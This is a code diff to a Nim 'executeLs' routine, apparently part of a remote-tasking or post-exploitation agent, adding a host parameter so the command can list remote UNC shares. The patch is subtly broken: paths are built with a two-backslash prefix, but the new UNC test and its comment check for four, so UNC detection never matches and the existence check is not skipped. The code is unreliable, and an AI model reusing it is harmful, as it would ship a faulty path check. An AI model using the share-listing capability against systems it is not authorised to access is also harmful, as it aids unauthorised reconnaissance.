@@ -177,11 +177,25 @@ proc executeLs*(params: JsonNode): JsonNode =
   
   # Expand and validate path
   try:
-    # Handle UNC paths (\\server\share) and absolute paths
-    if not targetPath.isAbsolute() and not targetPath.startsWith("\\\\"):
+    # Build UNC path if host is provided
+    if host.len > 0:
+      # Remove leading/trailing backslashes from path
+      var cleanPath = targetPath.strip(chars = {'\\', '/'})
+      # Build UNC path: \\host\share
+      targetPath = "\\\\" & host & "\\" & cleanPath
+    
+    # Handle UNC paths (\\\\server\\share) and absolute paths
+    when defined(windows):
+      # Normalize path separators for Windows
+      targetPath = targetPath.replace("/", "\\")
+    
+    if not targetPath.isAbsolute() and not targetPath.startsWith("\\\\\\\\"):
       targetPath = getCurrentDir() / targetPath
     
-    if not dirExists(targetPath):
+    # For UNC paths, walkDir will fail if the path doesn't exist
+    # So we can skip the dirExists check for UNC paths
+    let isUNC = targetPath.startsWith("\\\\\\\\")
+    if not isUNC and not dirExists(targetPath):
       return %*{
         "user_output": "Error: Path does not exist or is not a directory: " & targetPath,
         "completed": true,
